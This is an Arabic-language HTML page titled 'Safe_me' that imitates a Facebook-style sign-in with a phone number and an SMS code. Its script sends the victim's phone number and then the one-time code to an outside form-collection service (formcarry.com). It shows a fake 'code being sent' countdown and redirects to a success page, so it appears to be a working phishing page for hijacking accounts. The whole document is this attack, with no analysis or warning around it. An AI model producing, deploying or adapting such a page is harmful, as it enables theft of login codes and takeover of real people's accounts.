<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Safe_me</title>
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Cairo', sans-serif;
      background: linear-gradient(135deg, #4267B2, #29487d);
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      direction: rtl;
    }

    .container {
      background: white;
      border-radius: 16px;
      box-shadow: 0 12px 30px rgba(0, 0, 0, 0.15);
      padding: 30px 35px;
      width: 100%;
      max-width: 420px;
      box-sizing: border-box;
      text-align: center;
    }

    .container img.logo {
      width: 80px;
      height: 80px;
      margin-bottom: 15px;
    }

    h2 {
      margin-bottom: 25px;
      color: #4267B2;
      font-weight: 700;
      font-size: 22px;
    }

    label {
      display: block;
      margin-bottom: 8px;
      font-weight: 600;
      color: #444;
      text-align: right;
    }

    input[type="tel"],
    input[type="text"] {
      width: 100%;
      padding: 12px 15px;
      font-size: 16px;
      border-radius: 10px;
      border: 1.8px solid #ccc;
      margin-bottom: 18px;
      transition: border-color 0.3s ease;
      box-sizing: border-box;
      font-family: inherit;
    }

    input:focus {
      border-color: #1877f2;
      outline: none;
    }

    input:disabled {
      background-color: #f2f2f2;
    }

    button {
      width: 100%;
      padding: 13px;
      font-size: 17px;
      background-color: #1877f2;
      border: none;
      border-radius: 10px;
      color: white;
      cursor: pointer;
      font-weight: 700;
      transition: background-color 0.3s ease;
      margin-bottom: 15px;
    }

    button:hover:not(:disabled) {
      background-color: #145dbf;
    }

    button:disabled {
      background-color: #a7c3f2;
      cursor: not-allowed;
    }

    #timer {
      text-align: center;
      font-weight: 600;
      color: #666;
      margin-bottom: 20px;
      min-height: 24px;
    }

    #codeField {
      display: none;
    }

    .error {
      color: red;
      font-size: 14px;
      margin-top: -10px;
      margin-bottom: 15px;
    }
  </style>
</head>
<body>

  <div class="container">
    <img src="face.png" alt="الشعار" class="logo" />
    <h2>التسجيل برقم الهاتف</h2>

    <form id="phoneForm" onsubmit="return sendPhone(event);">
      <label for="phone">رقم الهاتف:</label>
      <input type="tel" id="phone" name="phone" required placeholder="اكتب رقم هاتفك" pattern="[0-9]{10,15}" title="أدخل رقم هاتف صحيح" autocomplete="tel" />
      <button type="submit" id="sendPhoneBtn">أرسل كود</button>
      <div id="timer"></div>
    </form>

    <form id="codeForm" onsubmit="return sendCode(event);">
      <div id="codeField">
        <label for="code">جاري إرسال الكود عبر SMS</label>
        <input type="text" id="code" name="code" placeholder="اكتب الكود هنا" autocomplete="one-time-code" />
        <div id="errorMessage" class="error"></div>
        <button type="submit" id="sendCodeBtn">طلب الدخول</button>
      </div>
    </form>
  </div>

  <script>
    let countdownInterval;
    const sendPhoneBtn = document.getElementById('sendPhoneBtn');
    const timerDisplay = document.getElementById('timer');
    const codeField = document.getElementById('codeField');
    const phoneInput = document.getElementById('phone');
    const codeInput = document.getElementById('code');
    const errorMessage = document.getElementById('errorMessage');

    function startTimer(duration) {
      let timeLeft = duration;
      timerDisplay.style.display = 'block';
      updateTimer(timeLeft);
      countdownInterval = setInterval(() => {
        timeLeft--;
        updateTimer(timeLeft);
        if (timeLeft <= 0) {
          clearInterval(countdownInterval);
          timerDisplay.style.display = 'none';
          sendPhoneBtn.disabled = false;
          phoneInput.disabled = false;
        }
      }, 1000);
    }

    function updateTimer(seconds) {
      const minutes = Math.floor(seconds / 60).toString().padStart(2, '0');
      const secs = (seconds % 60).toString().padStart(2, '0');
      timerDisplay.textContent = `يرجى الانتظار: ${minutes}:${secs}`;
    }

    function sendPhone(event) {
      event.preventDefault();

      if (!phoneInput.value.match(/^[0-9]{10,15}$/)) {
        alert('يرجى إدخال رقم هاتف صحيح مكون من 10 إلى 15 رقماً');
        phoneInput.focus();
        return false;
      }

      fetch('https://formcarry.com/s/zmPYXkf3utw', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Accept': 'application/json'
        },
        body: JSON.stringify({ phone: phoneInput.value })
      })
      .then(response => {
        if (!response.ok) throw new Error('فشل إرسال رقم الهاتف');

        phoneInput.disabled = true;
        sendPhoneBtn.disabled = true;
        codeField.style.display = 'block';
        startTimer(480); // 8 دقائق
      })
      .catch(error => {
        alert('تعذر إرسال رقم الهاتف. حاول مرة أخرى.');
        console.error(error);
      });

      return false;
    }

    function sendCode(event) {
      event.preventDefault();
      errorMessage.textContent = '';

      if (codeInput.value.trim() === '') {
        errorMessage.textContent = 'يرجى كتابة الكود المرسل إليك.';
        codeInput.focus();
        return false;
      }

      const payload = {
        phone: phoneInput.value,
        code: codeInput.value
      };

      fetch('https://formcarry.com/s/zmPYXkf3utw', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Accept': 'application/json'
        },
        body: JSON.stringify(payload)
      })
      .then(async response => {
        const data = await response.json();

        if (response.ok && data.success !== false) {
          window.location.href = 'success.html';
        } else {
          errorMessage.textContent = '❌ هناك خطأ في الكود المرسل. حاول مرة أخرى.';
        }
      })
      .catch(error => {
        errorMessage.textContent = '⚠️ تعذر الاتصال بالخادم.';
        console.error(error);
      });

      return false;
    }
  </script>

</body>
</html>
